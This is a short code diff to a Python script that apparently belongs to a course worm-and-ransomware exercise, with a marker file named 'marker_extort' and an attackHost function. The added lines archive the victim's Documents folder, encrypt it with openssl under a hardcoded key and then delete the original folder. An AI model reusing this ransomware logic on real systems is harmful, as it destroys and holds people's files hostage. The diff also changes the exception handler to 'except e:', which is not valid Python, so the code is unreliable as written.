@@ -8,6 +8,7 @@ import netifaces
 import urllib
 from subprocess import call
 import shutil
+import tarfile
 
 markerLocation = "/tmp/marker_extort.txt"
 
@@ -122,11 +123,19 @@ def attackHost(host):
 
 def encryptVictim():
 	try:
+		tar = tarfile.open("/home/ubuntu/Documents.tar", "w:gz")
+
+		# Add the exdir/ directory to the archive
+		tar.add("/home/ubuntu/Documents/")
+
+		# Close the archive file
+		tar.close()
 		call(["chmod", "a+x", "./openssl"])
-		call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])
+		call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents.tar", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])
 		shutil.rmtree('/home/ubuntu/Documents/')
-	except:
+	except e:
 		print("Couldn't encypt victim")
+		print e
 
 
 
